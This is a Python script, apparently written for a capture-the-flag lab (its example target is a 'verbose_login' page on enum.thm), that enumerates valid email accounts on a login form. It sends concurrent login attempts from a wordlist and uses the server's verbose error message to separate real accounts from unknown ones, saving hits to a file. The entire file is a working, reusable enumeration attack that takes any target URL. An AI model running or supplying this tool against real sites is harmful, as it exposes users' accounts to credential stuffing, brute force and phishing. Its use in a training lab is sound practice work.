#!/usr/bin/env python3
import asyncio
import aiohttp
import json

HEADERS = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
}
INVALID_ERROR_PHRASE = "email does not exist"

async def check_email(session, email, url, sem):
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }
    async with sem:
        try:
            async with session.post(url, headers=HEADERS, data=data) as resp:
                text = await resp.text()
                try:
                    response_json = await resp.json(content_type=None)
                except Exception:
                    try:
                        response_json = json.loads(text)
                    except Exception:
                        response_json = {}

                status = str(response_json.get("status", "")).lower()
                message = str(response_json.get("message", "")).lower()
                if not message:
                    message = text.lower()

                if status == "error" and INVALID_ERROR_PHRASE in message:
                    return None
                else:
                    return email
        except Exception:
            return None

async def enumerate_emails(url, email_file, concurrency=50, timeout_seconds=10):
    with open(email_file, "r") as f:
        emails = [line.strip() for line in f if line.strip()]

    sem = asyncio.Semaphore(concurrency)
    connector = aiohttp.TCPConnector(limit=0)

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout_seconds),
                                     connector=connector) as session:
        tasks = [asyncio.create_task(check_email(session, e, url, sem)) for e in emails]
        results = await asyncio.gather(*tasks)

    valid = [r for r in results if isinstance(r, str)]
    return valid

def main():
    target = input("Digite a URL do alvo (ex: http://enum.thm/labs/verbose_login/functions.php): ").strip()
    wordlist = input("Digite o caminho da wordlist: ").strip()
    threads = input("Número de conexões simultâneas [default 50]: ").strip()
    threads = int(threads) if threads.isdigit() else 50

    valid_emails = asyncio.run(enumerate_emails(target, wordlist, concurrency=threads))

    if valid_emails:
        print("\nValid emails found:")
        for e in valid_emails:
            print(e)
    else:
        print("\nNenhum email válido encontrado.")

    with open("valid_emails.txt", "w") as out:
        for e in valid_emails:
            out.write(e + "\n")

    print("\nResultados salvos em valid_emails.txt")

if __name__ == "__main__":
    main()
